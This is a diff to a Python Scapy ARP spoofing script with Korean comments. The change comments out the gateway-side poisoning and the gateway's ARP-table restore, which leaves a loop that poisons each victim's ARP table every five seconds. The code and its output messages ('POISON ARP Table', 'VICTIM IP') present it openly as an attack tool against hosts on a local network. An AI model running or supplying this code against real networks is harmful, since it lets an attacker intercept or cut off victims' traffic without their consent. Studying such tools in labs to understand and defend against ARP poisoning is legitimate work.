@@ -53,10 +53,10 @@ def restoreARP(target_ip:str, target_mac:str, gateway_ip:str, gateway_mac:str) -
     # 희생자 컴퓨터의 ARP테이블을 복구하는 ARP 패킷 (게이트웨이에서 보낸 것 처럼 위조)
     target_restore_arp=ARP(op=ARP_REPLY, psrc=gateway_ip, pdst=target_ip,  hwdst=BROADCAST_MAC, hwsrc=gateway_mac)
     # 게이트웨이의 ARP테이블을 복구하는 ARP 패킷 (희생자에서 보낸 것 처럼 위조)
-    gateway_restore_arp=ARP(op=ARP_REPLY, psrc=target_ip, pdst=gateway_ip, hwdst=BROADCAST_MAC, hwsrc=target_mac)
+    # gateway_restore_arp=ARP(op=ARP_REPLY, psrc=target_ip, pdst=gateway_ip, hwdst=BROADCAST_MAC, hwsrc=target_mac)
     
     # ARP 패킷 누락을 방지하기 위해 3번 전송
-    send(gateway_restore_arp, count=3)
+    # send(gateway_restore_arp, count=3)
     send(target_restore_arp, count=3)
 
 def scan_network(ip_range, timeout=1, my_ip=None):
@@ -150,13 +150,13 @@ def main(*args, **kwargs) -> int:
         print(f"ARP Spoofing 시작 -> VICTIM IP [{target_ip}]")
         print(f"[{target_ip}]: POISON ARP Table [{gateway_mac}] -> [{own_mac}]")
         poisonARP(gateway_ip, target_ip, target_mac)
-        poisonARP(target_ip, gateway_ip, gateway_mac)
+        # poisonARP(target_ip, gateway_ip, gateway_mac)
         
     try: # KeyboardInterrupt 발생 전까지 5초마다 ARP Spoofing을 계속한다.
         while True:
             for target_ip, target_mac in zip(target_ips, target_macs):
                 poisonARP(gateway_ip, target_ip, target_mac)
-                poisonARP(target_ip, gateway_ip, gateway_mac)
+                # poisonARP(target_ip, gateway_ip, gateway_mac)
                 sleep(5)
     except KeyboardInterrupt:
         for target_ip, target_mac in zip(target_ips, target_macs):
